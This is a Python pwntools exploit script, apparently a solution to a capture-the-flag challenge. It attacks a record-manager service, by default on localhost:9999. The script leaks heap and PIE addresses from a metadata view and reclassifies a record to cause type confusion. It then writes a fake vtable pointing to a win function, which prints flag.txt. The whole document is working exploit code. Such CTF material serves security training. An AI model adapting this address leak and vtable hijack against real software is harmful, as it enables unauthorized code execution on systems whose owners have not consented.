from pwn import *
import sys
context.log_level='info'
HOST,PORT=('localhost',9999) if len(sys.argv)<2 else (sys.argv[1],int(sys.argv[2]))
io=remote(HOST,PORT)
def menu(c): io.sendlineafter(b'> ',str(c).encode())
# 1) create Poem -> record 0
menu(1); io.sendlineafter(b'Type:',b'1')
# 2) inspect metadata record 0 -> leak
menu(5); io.sendlineafter(b'Record:',b'0')
io.recvuntil(b'storage=0x'); storage=int(io.recvline().strip(),16)
io.recvuntil(b'dispatch=0x'); dispatch=int(io.recvline().strip(),16)
pie=dispatch-0x4c08; win=pie+0x1dd0
log.success(f"storage={hex(storage)} dispatch={hex(dispatch)} pie={hex(pie)} win={hex(win)}")
# 3) reclassify record 0 -> type 5 (IMPORT)
menu(3); io.sendlineafter(b'Record:',b'0'); io.sendlineafter(b'classification:',b'5')
# 4) edit record 0 -> hex-write: obj+0=storage+8 (fake vtable), obj+8=win, obj+16=win
menu(2); io.sendlineafter(b'Record:',b'0')
payload=p64(storage+8)+p64(win)+p64(win)
io.sendlineafter(b'hex):',payload.hex().encode())
# 5) publish record 0 -> call [vtable+8] = win -> reads flag.txt
menu(6); io.sendlineafter(b'Record:',b'0')
data=io.recvall(timeout=4)
print(data.decode('latin1',errors='replace'))
m=re.search(r'(BDSEC\{[^}]*\}|FAKEFLAG\{[^}]*\})',data.decode('latin1',errors='replace'))
if m: log.success("FLAG: "+m.group(1))
